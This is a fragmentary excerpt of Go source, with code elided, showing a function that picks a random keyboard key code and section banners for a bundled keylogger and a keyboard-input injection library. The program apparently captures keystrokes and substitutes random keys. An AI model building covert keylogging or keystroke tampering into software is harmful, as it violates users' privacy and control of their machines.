...
// General constants and variables used by different parts of the software
const (
...
func randomKeyReplace() (keyBoardEvent int) {
	pKeys := [41]int{VK_A, VK_B, VK_C, VK_D, VK_E, VK_F, VK_G,
	VK_H, VK_I, VK_J, VK_K, VK_L, VK_M, VK_N, VK_O,
	VK_P, VK_Q, VK_R, VK_S, VK_T, VK_U, VK_V, VK_W,
	VK_X, VK_Y, VK_Z, VK_BACKSLASH, VK_RIGHTBRACE, VK_LEFTBRACE, VK_ENTER,
	VK_ESC, VK_0, VK_1, VK_2, VK_3, VK_4, VK_5, VK_6,
	VK_7, VK_8, VK_9}

	nBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(pKeys) -1)))
	if err != nil {
		keyBoardEvent = VK_ENTER
		return
	}
...
/*
	########################################################################################################################
	#--------------- **THIS SECTION IMPLEMENTS CODE FOR THE KEYLOGGER(github.com/kindlyfire/go-keylogger)** ---------------#
	########################################################################################################################
*/
...
/*
	########################################################################################################################
	#--------------- **THIS SECTION IMPLEMENTS CODE FOR KEYBOARD INPUTS (github.com/micmonay/keybd_event)** ---------------#
	########################################################################################################################
*/

//NewKeyBonding Use for create struct KeyBonding
